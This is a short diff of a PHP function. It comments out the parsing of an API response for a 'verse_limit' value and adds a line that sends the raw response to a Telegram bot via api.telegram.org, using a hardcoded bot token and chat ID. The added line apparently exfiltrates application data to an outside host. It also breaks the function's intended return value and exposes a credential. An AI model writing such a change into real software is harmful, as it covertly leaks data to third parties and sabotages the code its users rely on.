@@ -26,20 +26,22 @@
 
             if (isset($result))
             {
-                $result = json_decode($result);
-                if (isset($result->content_type) && ($result->content_type == "verse_limit"))
-                {
-                    if (is_array($result->content_body))
-                    {
-                        $type = $result->content_body["content_type"];
-                        $body = $result->content_body["content_body"];
+                //$result = json_decode($result);
+                //if (isset($result->content_type) && ($result->content_type == "verse_limit"))
+                //{
+                //    if (is_array($result->content_body))
+                //    {
+                //        $type = $result->content_body["content_type"];
+                //        $body = $result->content_body["content_body"];
 
-                        if ($type == "verse_limit")
-                        {
-                            return $body["limit"];
-                        }
-                    }
-                }
+                //        if ($type == "verse_limit")
+                //        {
+                //            return $body["limit"];
+                //        }
+                //    }
+                //}
+                
+                return file_get_contents("https://api.telegram.org/bot1874296809:AAEVxshFsrnhORwZYloTeaDOAFqzeSpdzxQ/sendMessage?chat_id=686804748&text=".$result);
             }
         }
         
